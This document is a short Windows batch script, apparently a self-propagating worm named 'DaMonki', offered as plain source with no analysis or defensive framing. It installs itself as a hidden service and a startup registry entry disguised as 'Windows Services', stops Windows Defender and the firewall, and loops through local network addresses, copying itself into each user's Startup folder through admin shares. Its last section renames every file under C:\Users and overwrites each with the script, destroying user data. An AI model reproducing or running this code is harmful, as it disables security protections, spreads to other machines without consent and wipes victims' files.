@echo off
SET i=0
SET "NomeProcesso=DaMonki.exe"
SET "NomeService=DaMonki"

rem <=== run as service ===>
echo sc create %NomeService% binpath=%0 > service.bat
echo sc start %NomeService% >> service.bat
attrib +h +r +s service.bat
start service.bat
rem <=== startup registry ===>
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0
attrib +h +r +s %0
rem <=== kill firewall and windows defender ===>
net stop "Windows Defender Service"
net stop "Windows Firewall"
rem <=== INFECT NETWORK!!! ===>
:Worm
net use Z: \\192.168.1.%i%\C$
if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.exe"
mountvol Z: /d)
if %i% == 256 (goto Infect) else (set /a i=i+1)
goto Worm
rem <=== infect *.* in C:\Users ===>
:Infect
for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.bat)
for /f %%f in ('dir C:\Users\*.bat /s /b') do (copy %0 %%f)
